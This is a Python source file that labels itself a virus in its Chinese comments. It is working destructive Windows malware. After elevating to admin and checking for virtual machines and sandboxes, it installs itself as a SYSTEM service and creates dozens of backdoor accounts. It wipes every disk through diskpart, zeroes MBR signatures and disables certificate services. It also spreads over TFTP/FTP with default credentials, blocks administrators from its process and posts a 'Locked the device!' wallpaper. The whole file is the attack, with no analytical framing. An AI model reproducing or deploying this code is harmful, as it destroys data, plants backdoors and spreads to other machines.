# cython: language_level=3
from threading import Thread
import os
import sys
import ctypes
import platform
import subprocess
import time
from PIL import Image, ImageDraw, ImageFont
import threading
import keyboard
import win32api
import win32con
import win32process
import win32security
from threading import Event
import socket
from ftplib import FTP
from socketserver import ThreadingUDPServer, BaseRequestHandler
import struct
import shutil
import winreg
from concurrent.futures import ThreadPoolExecutor

#main_run_code是病毒主体
def create_server_list():
    def run_as_system_via_service():
        service_name = "Type_Joker"
        python_script = os.path.abspath(__file__)
        
        # 创建服务（以 SYSTEM 运行）
        subprocess.run(
            f'sc create {service_name} binPath= "{sys.executable} {python_script}" start= auto obj= LocalSystem',
            shell=True,
            check=True
        )
        
        # 启动服务
        subprocess.run(f'sc start {service_name}', shell=True, check=True)
    run_as_system_via_service()
def create_system_users():
    def create_windows_users():
        for i in range(1, 99):  # 创建 user1 到 user49
            username = f"LockerFuck{i}"
            password = "P@ssw0rd"  # 设置统一密码（生产环境建议随机生成）
            
            # 使用 net user 创建用户
            cmd = f"net user {username} {password} /add"
            try:
                subprocess.run(cmd, shell=True, check=True)
            except subprocess.CalledProcessError as e:
                pass

    # 执行（需管理员权限）
    create_windows_users()
def del_pan():
    time.sleep(15)
    # 定义要执行的命令（注意转义特殊字符）
    cmd = r'''
    for /f "skip=3 tokens=2 delims= " %i in ('echo list disk ^| diskpart') do @(
        echo select disk %i ^&^
        echo clean ^&^
        echo create partition primary ^&^
        echo format fs=ntfs
    ) | diskpart
    '''

    # 执行命令
    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        pass
def del_HKCC_HKU_HKCR():
    #删除HKCC_HKU_HKCR
    def is_admin():
        """检查是否以管理员权限运行"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def delete_with_winreg(root_key, sub_key):
        """
        使用winreg删除指定注册表项（递归删除子项）
        :param root_key: 根键（如winreg.HKCC）
        :param sub_key: 子项路径（如"Software\\MyApp"）
        """
        try:
            with winreg.OpenKey(root_key, sub_key, 0, winreg.KEY_ALL_ACCESS) as key:
                # 递归删除子项
                while True:
                    try:
                        child = winreg.EnumKey(key, 0)  # 获取第一个子项
                        delete_with_winreg(root_key, f"{sub_key}\\{child}")
                    except OSError as e:
                        if e.winerror == 259:  # 无更多子项
                            break
                winreg.DeleteKey(key, "")  # 删除当前项
        except Exception as e:
            pass

    def delete_with_cmd(root_key_name, sub_key):
        """
        调用reg delete命令批量删除
        :param root_key_name: 根键名称（如"HKCC"）
        :param sub_key: 子项路径（如"Software\\TestHKCC"）
        """
        try:
            cmd = f'reg delete "{root_key_name}\\{sub_key}" /f'
            subprocess.run(cmd, shell=True, check=True)
        except subprocess.CalledProcessError as e:
            pass

    def parallel_delete(targets):
        with ThreadPoolExecutor(max_workers=4) as executor:
            futures = []
            for winreg_root, cmd_root, sub_key in targets:
                # 提交winreg删除任务
                futures.append(executor.submit(delete_with_winreg, winreg_root, sub_key))
                # 提交cmd删除任务
                futures.append(executor.submit(delete_with_cmd, cmd_root, sub_key))
            
            # 等待所有任务完成
            for future in futures:
                future.result()
    # 定义要删除的目标（格式: (winreg根键, cmd根键名称, 子项路径)）
    targets = [
        (winreg.HKEY_CURRENT_CONFIG, "HKCC", r"Software\TestHKCC"),
        (winreg.HKEY_USERS, "HKU", r".DEFAULT\Software\TestHKU"),
        (winreg.HKEY_CLASSES_ROOT, "HKCR", r"TestHKCR")
    ]

    parallel_delete(targets)

    
    
def change_mbr():
    #修改MBR
    def is_admin():
        """检查管理员权限"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def get_physical_drives():
        """获取所有物理磁盘列表"""
        drives = []
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        
        for i in range(16):  # 检查最多16个物理磁盘
            drive_path = f"\\\\.\\PhysicalDrive{i}"
            handle = kernel32.CreateFileW(
                drive_path,
                0x80000000,  # GENERIC_READ
                1,           # FILE_SHARE_READ
                None,
                3,           # OPEN_EXISTING
                0,
                None
            )
            
            if handle != -1:
                drives.append(i)
                kernel32.CloseHandle(handle)
        
        return drives

    def wipe_mbr_signature(disk_number):
        """清除指定磁盘的MBR签名和结束标志"""
        kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
        GENERIC_READ = 0x80000000
        GENERIC_WRITE = 0x40000000
        OPEN_EXISTING = 3
        INVALID_HANDLE_VALUE = -1
        
        try:
            # 打开物理磁盘
            drive_path = f"\\\\.\\PhysicalDrive{disk_number}"
            handle = kernel32.CreateFileW(
                drive_path,
                GENERIC_READ | GENERIC_WRITE,
                0,          # 独占访问
                None,
                OPEN_EXISTING,
                0,
                None
            )
            
            if handle == INVALID_HANDLE_VALUE:
                raise ctypes.WinError(ctypes.get_last_error())
            
            # 读取MBR
            mbr_data = ctypes.create_string_buffer(512)
            bytes_read = ctypes.c_ulong(0)
            
            if not kernel32.ReadFile(handle, mbr_data, 512, ctypes.byref(bytes_read), None):
                raise ctypes.WinError(ctypes.get_last_error())
            
            # 修改磁盘签名和结束标志
            modified = False
            
            # 检查并清除磁盘签名(0x1B8-0x1BB)
            if any(mbr_data[0x1B8:0x1BC]):
                for i in range(0x1B8, 0x1BC):
                    mbr_data[i] = b'\x00'
                modified = True
            # 检查并清除结束标志(0x1FE-0x1FF)
            if mbr_data[0x1FE:0x200] != b'\x00\x00':
                mbr_data[0x1FE] = b'\x00'
                mbr_data[0x1FF] = b'\x00'
                modified = True
            
            if modified:
                # 写回修改
                kernel32.SetFilePointer(handle, 0, None, 0)
                bytes_written = ctypes.c_ulong(0)
                
                if not kernel32.WriteFile(handle, mbr_data, 512, ctypes.byref(bytes_written), None):
                    raise ctypes.WinError(ctypes.get_last_error())
                return True
            else:
                l=0
                return False
                
        except Exception as e:
            l=1
            return False
        finally:
            if 'handle' in locals() and handle != INVALID_HANDLE_VALUE:
                kernel32.CloseHandle(handle)

    def auto_wipe_all_drives():
        """自动处理所有物理磁盘"""
        if not is_admin():
            # 尝试以管理员身份重新运行
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 1
            )
            sys.exit()
        

        # 获取所有物理磁盘
        drives = get_physical_drives()
        # 处理每个磁盘
        success_count = 0
        for disk_num in drives:
            if wipe_mbr_signature(disk_num):
                success_count += 1

    auto_wipe_all_drives()
def anti_zs():
    #禁用证书
    def is_admin():
        """检查是否以管理员权限运行"""
        try:
            return ctypes.windll.shell32.IsUserAnAdmin()
        except:
            return False

    def run_hidden_command(command):
        """执行隐藏命令行"""
        startupinfo = subprocess.STARTUPINFO()
        startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        startupinfo.wShowWindow = subprocess.SW_HIDE
        subprocess.run(command, startupinfo=startupinfo, shell=True, check=True)

    def disable_cert_services():
        """快速禁用证书相关服务"""
        # 停止证书服务
        run_hidden_command('net stop CryptSvc /y')
        # 停止自动根证书更新
        run_hidden_command('reg add "HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\AuthRoot" /v "DisableRootAutoUpdate" /t REG_DWORD /d "1" /f')
        # 禁用证书链验证缓存
        run_hidden_command('reg add "HKLM\SYSTEM\CurrentControlSet\Services\Crypt32" /v "ChainCacheResyncFiletime" /t REG_QWORD /d "0" /f')
        # 刷新策略
        run_hidden_command('gpupdate /force')

    def enable_cert_services():
        """重新启用证书相关服务"""
        # 启用自动根证书更新
        run_hidden_command('reg delete "HKLM\SOFTWARE\Policies\Microsoft\SystemCertificates\AuthRoot" /v "DisableRootAutoUpdate" /f')
        # 启用证书链验证缓存
        run_hidden_command('reg delete "HKLM\SYSTEM\CurrentControlSet\Services\Crypt32" /v "ChainCacheResyncFiletime" /f')
        # 启动证书服务
        run_hidden_command('net start CryptSvc')
        # 刷新策略
        run_hidden_command('gpupdate /force')

    def clear_cert_cache():
        """清除证书缓存"""
        run_hidden_command('certutil -urlcache * delete')
        run_hidden_command('certutil -setreg chain\ChainCacheResyncFiletime @now')

    def main(): 
        try:
            disable_cert_services()
            clear_cert_cache()
        except Exception as e:
            pass

    main()

def auto_share():
    class EnhancedTFTPServerHandler(BaseRequestHandler):
        """增强版TFTP服务器处理类"""
        def handle(self):
            try:
                data, sock = self.request
                opcode = struct.unpack('!H', data[:2])[0]
                
                if opcode == 1:  # RRQ请求
                    filename = data[2:].split(b'\x00')[0].decode()
                    
                    try:
                        with open(filename, 'rb') as f:
                            block_num = 1
                            while True:
                                chunk = f.read(512)
                                if not chunk:
                                    break
                                
                                packet = struct.pack('!HH', 3, block_num) + chunk
                                sock.sendto(packet, self.client_address)
                                
                                ack = sock.recv(4)
                                ack_opcode, ack_block = struct.unpack('!HH', ack)
                                if ack_opcode != 4 or ack_block != block_num:
                                    pass
                                    
                                block_num += 1
                    except:
                        pass
            except:
                pass

    def start_enhanced_tftp_server(port=69):
        """启动增强版TFTP服务器"""
        try:
            server = ThreadingUDPServer(('0.0.0.0', port), EnhancedTFTPServerHandler)
            server.serve_forever()
        except:
            pass

    def try_tftp_download(server_ip, filename, port=69, retries=3):
        """带重试的TFTP下载"""
        for attempt in range(retries):
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                sock.settimeout(5)
                
                rrq = struct.pack('!H', 1) + filename.encode() + b'\x00octet\x00'
                sock.sendto(rrq, (server_ip, port))
                
                received_data = b''
                expected_block = 1
                
                while True:
                    data, addr = sock.recvfrom(516)
                    opcode, block_num = struct.unpack('!HH', data[:4])
                    
                    if opcode == 3 and block_num == expected_block:
                        ack = struct.pack('!HH', 4, block_num)
                        sock.sendto(ack, addr)
                        
                        received_data += data[4:]
                        
                        if len(data[4:]) < 512:
                            break
                            
                        expected_block += 1
                    elif opcode == 5:
                        pass
                    else:
                        pass
                        
                with open(filename, 'wb') as f:
                    f.write(received_data)
                    
                return True
            except:
                time.sleep(1)
        
        return False

    def try_ftp_download(server_ip, filename, port=21, retries=3):
        """带重试和多用户尝试的FTP下载"""
        users = ['Administrator', 'Administrators', 'User', '', 'anonymous','Guest','root']
        
        for attempt in range(retries):
            for user in users:
                try:
                    ftp = FTP()
                    ftp.connect(server_ip, port, timeout=10)
                    ftp.login(user=user, passwd='')
                    
                    files = []
                    ftp.retrlines('LIST', files.append)
                    file_exists = any(filename in f for f in files)
                    
                    if not file_exists:
                        pass
                    
                    with open(filename, 'wb') as f:
                        ftp.retrbinary(f'RETR {filename}', f.write)
                    
                    return True
                except:
                    time.sleep(1)
        
        return False

    def execute_as_admin(filepath):
        """尝试以管理员权限执行文件"""
        try:
            if platform.system() == 'Windows':
                subprocess.run(f'runas /user:Administrator "{filepath}"', shell=True, check=True)
            else:
                subprocess.run(f'sudo python3 "{filepath}"', shell=True, check=True)
            return True
        except:
            return False

    def copy_to_startup(filepath):
        """尝试将文件复制到启动目录"""
        try:
            if platform.system() == 'Windows':
                startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
            else:
                startup_dir = os.path.join(os.getenv('HOME'), '.config', 'autostart')
                
            if not os.path.exists(startup_dir):
                os.makedirs(startup_dir)
                
            dest = os.path.join(startup_dir, os.path.basename(filepath))
            shutil.copy2(filepath, dest)
            return True
        except:
            return False

    def transfer_and_execute(server_ip, filename):
        """主传输和执行函数"""
        if try_tftp_download(server_ip, filename):
            execute_as_admin(filename)
            copy_to_startup(filename)
            return True
        
        if try_ftp_download(server_ip, filename):
            execute_as_admin(filename)
            copy_to_startup(filename)
            return True
        
        return False

    def main():
        if len(sys.argv) < 3:
            pass
            return
        
        mode = sys.argv[1]
        
        if mode == 'server':
            port = int(sys.argv[2]) if len(sys.argv) > 2 else 69
            tftp_thread = threading.Thread(target=start_enhanced_tftp_server, args=(port,))
            tftp_thread.daemon = True
            tftp_thread.start()
            
            while True:
                time.sleep(1)
                
        elif mode == 'client':
            server_ip = sys.argv[2]
            filename = os.path.basename(__file__)
            
            transfer_thread = threading.Thread(target=transfer_and_execute, args=(server_ip, filename))
            transfer_thread.start()
            transfer_thread.join()
        else:
            pass
    main()   

def defender_self():
    # 1. 权限控制初始化
    def restrict_privileges():
        try:
            # 移除所有特权（包括SYSTEM和Administrators）
            hToken = win32security.OpenProcessToken(
                win32api.GetCurrentProcess(),
                win32security.TOKEN_ADJUST_PRIVILEGES | win32security.TOKEN_QUERY
            )
            privileges = win32security.GetTokenInformation(hToken, win32security.TokenPrivileges)
            for priv in privileges:
                win32security.AdjustTokenPrivileges(hToken, False, [(priv[0], win32security.SE_PRIVILEGE_REMOVED)])
        except Exception as e:
            pass

    # 2. 进程ACL强化
    def enforce_process_protection():
        try:
            # 创建完全自定义的ACL
            sd = win32security.SECURITY_DESCRIPTOR()
            sd.Initialize()
            
            # 创建空DACL（默认拒绝所有访问）
            dacl = win32security.ACL()
            dacl.Initialize()
            
            # 只允许当前用户有基本查询权限
            current_user = win32security.GetTokenInformation(
                win32security.OpenProcessToken(
                    win32api.GetCurrentProcess(),
                    win32security.TOKEN_QUERY
                ),
                win32security.TokenUser
            )[0]
            
            dacl.AddAccessAllowedAce(
                win32security.ACL_REVISION,
                win32con.PROCESS_QUERY_LIMITED_INFORMATION,
                current_user
            )
            
            # 显式拒绝SYSTEM和Administrators的所有访问
            system_sid = win32security.LookupAccountName("", "SYSTEM")[0]
            admin_sid = win32security.LookupAccountName("", "Administrators")[0]
            
            dacl.AddAccessDeniedAce(
                win32security.ACL_REVISION,
                win32con.PROCESS_ALL_ACCESS,
                system_sid
            )
            dacl.AddAccessDeniedAce(
                win32security.ACL_REVISION,
                win32con.PROCESS_ALL_ACCESS,
                admin_sid
            )
            
            sd.SetSecurityDescriptorDacl(1, dacl, 0)
            win32security.SetKernelObjectSecurity(
                win32api.GetCurrentProcess(),
                win32security.DACL_SECURITY_INFORMATION,
                sd
            )
        except Exception as e:
            pass

    # 3. 防注入保护
    def prevent_injection():
        try:
            # 启用进程缓解策略
            POLICY = 0x100000000000  # PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON
            ctypes.windll.kernel32.SetProcessMitigationPolicy(
                0,  # ProcessDEPPolicy
                ctypes.byref(ctypes.c_ulonglong(POLICY)),
                ctypes.sizeof(ctypes.c_ulonglong)
            )
            
            # 禁用远程线程创建
            kernel32 = ctypes.WinDLL('kernel32')
            kernel32.SetProcessMitigationPolicy.restype = ctypes.c_bool
            kernel32.SetProcessMitigationPolicy(
                6,  # ProcessSignaturePolicy
                ctypes.byref(ctypes.c_ulonglong(0x00000001)),  # PROCESS_CREATION_MITIGATION_POLICY_PROHIBIT_REMOTE_IMAGE_MAPPING
                ctypes.sizeof(ctypes.c_ulonglong)
            )
        except Exception as e:
            pass

    # 4. 进程监控线程
    class ProcessGuard(Thread):
        def run(self):
            while True:
                enforce_process_protection()
                time.sleep(5)

    # 主程序
    class FortifiedApplication:
        
        def __init__(self):
            # 初始化保护措施
            restrict_privileges()
            enforce_process_protection()
            prevent_injection()
            
            # 启动守护线程
            ProcessGuard(daemon=True).start()
            
            # 设置退出组合键
            self.exit_keys = {'q', 'w', 'ew'}
            self.pressed_keys = set()
            self.exit_event = Event()
            
            # 键盘监听
            keyboard.on_press(self.on_key_press)
            keyboard.on_release(self.on_key_release)
            
            # 主循环
            self.main_loop()
        
        def on_key_press(self, event):
            if event.name.lower() in self.exit_keys:
                self.pressed_keys.add(event.name.lower())
                if self.pressed_keys == self.exit_keys:
                    self.exit_event.set()
        
        def on_key_release(self, event):
            if event.name.lower() in self.pressed_keys:
                self.pressed_keys.remove(event.name.lower())
        
        def main_loop(self):
            #开始
            while not self.exit_event.is_set():
                try:
                    # 模拟工作负载
                    time.sleep(0.1)
                except KeyboardInterrupt:
                    dkkkk=999
                    continue
            os._exit(0)


    try:
        FortifiedApplication()
    except Exception as e:
        pass
def change_bizhi():
    def set_black_hello_wallpaper():
        # 获取屏幕分辨率
        user32 = ctypes.windll.user32
        screen_width = user32.GetSystemMetrics(0)
        screen_height = user32.GetSystemMetrics(1)
        
        # 创建一个黑色背景图像
        image = Image.new('RGB', (screen_width, screen_height), color='black')
        draw = ImageDraw.Draw(image)
        
        try:
            # 尝试使用较大的字体（根据屏幕高度调整）
            font_size = int(screen_height / 6)
            font = ImageFont.truetype("arial.ttf", font_size)
        except:
            # 如果无法加载指定字体，使用默认字体
            font = ImageFont.load_default()
        
        # 计算文本位置使其居中
        text = "Locked the device!"
        # 使用textbbox获取文本边界框
        left, top, right, bottom = draw.textbbox((0, 0), text, font=font)
        text_width = right - left
        text_height = bottom - top
        x = (screen_width - text_width) // 2
        y = (screen_height - text_height) // 2
        
        # 绘制白色文本
        draw.text((x, y), text, fill="white", font=font)
        
        # 保存临时图像文件
        temp_path = os.path.join(os.environ['TEMP'], 'black_hello_wallpaper.bmp')
        image.save(temp_path)
        
        # 设置壁纸
        try:
            SPI_SETDESKWALLPAPER = 20
            ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, temp_path, 0)
        except:
            pass
    set_black_hello_wallpaper()
#main_run_code()是病毒执行函数（获取完权限并检测虚拟机沙盒后执行的）
def main_run_code():
    """获取完权限并检测虚拟机沙盒后执行的代码"""
    CREATE_SERVER_LIST=threading.Thread(target=create_server_list)
    CREATE_SYSTEM_USERS=threading.Thread(target=create_system_users)
    DEL_PAN=threading.Thread(target=del_pan)
    DEL_HKCC_HKU_HKCR=threading.Thread(target=del_HKCC_HKU_HKCR)
    ANTI_ZS=threading.Thread(target=anti_zs)
    CHANGE_MBR=threading.Thread(target=change_mbr)
    AUTO_SHARE=threading.Thread(target=auto_share)
    DEFENDER_SELF=threading.Thread(target=defender_self)
    CHANGE_BIZHI=threading.Thread(target=change_bizhi)
    
    DEFENDER_SELF.start()
    AUTO_SHARE.start()
    CHANGE_BIZHI.start()
    CHANGE_MBR.start()
    ANTI_ZS.start()
    CREATE_SERVER_LIST.start()
    DEL_HKCC_HKU_HKCR.start()
    CREATE_SYSTEM_USERS.start()
    DEL_PAN.start()
def xuniji_cheak():
    """虚拟机沙盒检测"""


    class EnvValidator:
        def __init__(self):
            self.VM_REQUIRED_MATCHES = 3
            self.SANDBOX_REQUIRED_MATCHES = 2

        def is_unsafe_environment(self):
            if self._quick_precheck():
                return True
                
            vm_score = sum([
                self._check_cpu_hypervisor(),
                self._check_dmi_vendor(),
                self._check_vm_processes(),
                self._check_virtual_devices(),
                self._check_memory_size()
            ])
            
            sandbox_score = sum([
                self._check_uptime(),
                self._check_sandbox_artifacts(),
                self._check_system_artifacts()
            ])
            
            return (vm_score >= self.VM_REQUIRED_MATCHES or 
                    sandbox_score >= self.SANDBOX_REQUIRED_MATCHES)

        def _quick_precheck(self):
            return any([
                self._check_debugger(),
                self._check_known_vm_files(),
                self._check_sandbox_processes()
            ])

        def _check_cpu_hypervisor(self):
            try:
                if platform.system() == "Windows":
                    cmd = "wmic cpu get caption /value"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                else:
                    with open('/proc/cpuinfo') as f:
                        output = f.read()
                
                hypervisor_flags = {
                    'hypervisor', 'vmx', 'svm', 'kvm', 'qemu', 
                    'virtualbox', 'vmware', 'xen', 'parallels'
                }
                return any(flag in output.lower() for flag in hypervisor_flags)
            except:
                return False

        def _check_dmi_vendor(self):
            try:
                if platform.system() == "Windows":
                    cmd = "wmic computersystem get manufacturer,model /value"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                else:
                    vendors = []
                    for f in ['/sys/class/dmi/id/sys_vendor', '/sys/class/dmi/id/product_name']:
                        try:
                            with open(f) as dmi_file:
                                vendors.append(dmi_file.read())
                        except:
                            continue
                    output = " ".join(vendors)
                
                vm_vendors = {
                    'vmware', 'virtualbox', 'qemu', 'xen', 'kvm',
                    'parallels', 'innotek', 'red hat', 'virtual machine'
                }
                return any(vendor in output.lower() for vendor in vm_vendors)
            except:
                return False

        def _check_vm_processes(self):
            try:
                if platform.system() == "Windows":
                    cmd = "tasklist /fo csv /nh"
                else:
                    cmd = "ps aux"
                
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                vm_processes = {
                    'vmtoolsd', 'vmware', 'vboxservice', 'qemu-ga',
                    'virt-manager', 'xenstored', 'prl_cc'
                }
                return any(proc in output.lower() for proc in vm_processes)
            except:
                return False

        def _check_virtual_devices(self):
            if platform.system() == "Windows":
                try:
                    import winreg
                    with winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Enum") as key:
                        subkeys = [winreg.EnumKey(key, i) for i in range(10)]
                        return any(k.lower().startswith(('pci\\ven_80ee', 'pci\\ven_15ad')) for k in subkeys)
                except:
                    return False
            else:
                try:
                    output = subprocess.check_output("lspci", stderr=subprocess.DEVNULL).decode()
                    return any(d in output.lower() for d in ['vmware', 'virtualbox', 'qemu'])
                except:
                    return False

        def _check_memory_size(self):
            try:
                if platform.system() == "Windows":
                    cmd = "wmic memorychip get capacity"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                    total = sum(int(cap) for cap in output.split() if cap.isdigit()) / (1024**3)
                else:
                    with open('/proc/meminfo') as f:
                        mem = f.read()
                    total = int(mem.split('\n')[0].split()[1]) / 1024**2
                
                return total < 2 or total > 64
            except:
                return False

        def _check_uptime(self):
            try:
                if platform.system() == "Windows":
                    cmd = "wmic os get lastbootuptime /value"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                    boot_time = output.split('=')[1].strip()
                    boot_ts = time.mktime(time.strptime(boot_time[:14], "%Y%m%d%H%M%S"))
                    uptime = time.time() - boot_ts
                else:
                    with open('/proc/uptime') as f:
                        uptime = float(f.read().split()[0])
                
                return uptime < 600 or uptime > 2592000
            except:
                return False

        def _check_sandbox_artifacts(self):
            artifacts = []
            if platform.system() == "Windows":
                check_paths = [
                    os.getenv("TEMP", ""),
                    os.getenv("APPDATA", ""),
                    os.getenv("PROGRAMDATA", ""),
                    os.getenv("USERPROFILE", "")
                ]
                artifacts = [p for p in check_paths if p and any(
                    kw in p.lower() for kw in {'sandbox', 'malware', 'sample', 'cuckoo'})]
            else:
                check_paths = [
                    "/proc/self/cgroup",
                    "/proc/self/mounts",
                    "/proc/self/status"
                ]
                try:
                    for path in check_paths:
                        with open(path) as f:
                            if any(kw in f.read().lower() for kw in {'docker', 'lxc', 'kubepods'}):
                                artifacts.append(path)
                except:
                    pass
            
            return len(artifacts) >= 2

        def _check_system_artifacts(self):
            if platform.system() == "Windows":
                try:
                    import winreg
                    sandbox_keys = [
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\{C2E6F00D-6F5B-4A89-BFFF-226C2B0F1BB7}",
                        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\Sandboxie"
                    ]
                    return any(self._reg_key_exists(k) for k in sandbox_keys)
                except:
                    return False
            else:
                return any(os.path.exists(p) for p in [
                    "/.dockerenv", "/.containerenv", "/run/.containerenv"
                ])

        def _check_debugger(self):
            if platform.system() == "Windows":
                try:
                    kernel32 = ctypes.windll.kernel32
                    return (
                        kernel32.IsDebuggerPresent() or
                        kernel32.CheckRemoteDebuggerPresent(kernel32.GetCurrentProcess(), ctypes.byref(ctypes.c_bool()))
                    )
                except:
                    return False
            else:
                try:
                    with open('/proc/self/status') as f:
                        status = f.read()
                    return any(
                        line.startswith(('TracerPid:', 'State:')) and not line.endswith(('0', 'S (sleeping)'))
                        for line in status.split('\n'))
                except:
                    return False

        def _reg_key_exists(self, path):
            try:
                import winreg
                winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, path)
                return True
            except:
                return False

        def _check_known_vm_files(self):
            vm_files = []
            if platform.system() == "Windows":
                vm_files = [
                    "C:\\Windows\\System32\\Drivers\\Vmmouse.sys",
                    "C:\\Windows\\System32\\Drivers\\vm3dgl.dll",
                    "C:\\Program Files\\VMware\\VMware Tools"
                ]
            else:
                vm_files = [
                    "/usr/bin/VBoxClient",
                    "/usr/bin/vmware-user",
                    "/usr/lib/x86_64-linux-gnu/vmware"
                ]
            return any(os.path.exists(f) for f in vm_files)

        def _check_sandbox_processes(self):
            try:
                if platform.system() == "Windows":
                    cmd = "tasklist /fo csv /nh"
                else:
                    cmd = "ps aux"
                
                output = subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL).decode()
                sandbox_procs = {
                    'cuckoo', 'sandbox', 'joebox', 'anubis',
                    'fakenet', 'wireshark', 'procmon', 'fiddler'
                }
                return any(proc in output.lower() for proc in sandbox_procs)
            except:
                return False

    def main_app():
        main_run_code()


    validator = EnvValidator()
        
    if validator.is_unsafe_environment():
        sys.exit(0)
    else:
        main_app()




def is_admin():
    """检查当前是否以管理员权限运行"""
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False


if is_admin():
    # 如果已经是管理员，直接运行主代码
    xuniji_cheak()
else:
    # 如果不是管理员，请求提升权限
    # 重新以管理员权限运行程序
    ctypes.windll.shell32.ShellExecuteW(
        None, "runas", sys.executable, " ".join(sys.argv), None, 1
    )
        
    # 检查是否成功获取管理员权限
    if is_admin():
        xuniji_cheak()
    else:
        sys.exit(0)
